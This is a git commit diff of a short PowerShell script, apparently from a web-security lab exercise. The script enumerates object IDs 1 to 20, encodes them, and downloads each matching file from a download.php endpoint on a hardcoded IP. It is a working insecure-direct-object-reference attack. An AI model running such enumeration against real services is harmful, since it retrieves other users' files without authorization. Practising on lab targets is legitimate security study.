425e9f7d066c79535544a66808a7e7f20aeed576
console8833 <console8833@outlook.com>
2024-05-15 13:35:55 +0800

    code: download files with output path

--- powershell_downloader_hashing.ps1
+++ powershell_downloader_hashing.ps1
@@ -1,24 +1,22 @@
-$url = "http://94.237.54.214:56848"
+$url = "http://94.237.54.214:34215/"
 
 # loop thru uid 1 to 20
 for ($i = 1; $i -le 20; $i++) {
     # convert the value to base64 without newlines
     $base64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($i))
 
-    # calculate md5 hash
-    $md5 = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($base64))
+    # url encode the base64 encoded string
+    $urlEncoded = [System.Uri]::EscapeDataString($base64)
+    # Write-Output $urlEncoded  # print debugging
 
-    # convert md5 hash to a hexadecimal string
-    $md5hex = [System.BitConverter]::ToString($md5) -replace '-',''
-    
-    # convert md5 values to lowercase
-    $md5hexlowered = $md5hex.ToLower()
+    $response = Invoke-WebRequest -Uri "$url/download.php?contract=$urlEncoded" -Method GET 
 
-    Write-Output $md5hexlowered
+    # extract filename from Content-Disposition header
+    $filename = $response.Headers['Content-Disposition'] -replace 'attachment; filename="([^"]+)"', '$1'
 
-    $response = Invoke-WebRequest -Uri "$url/documents.php" -Method POST -Body "uid=$md5hexlowered"
-    $links = $response.Links | Select-Object -ExpandProperty href
-    "$url : $links"
+    $outputPath = "/tmp/$filename"
 
-}
+    # download the file
+    Invoke-WebRequest -Uri "$url/download.php?contract=$urlEncoded" -Outfile $outputPath
+ }
 
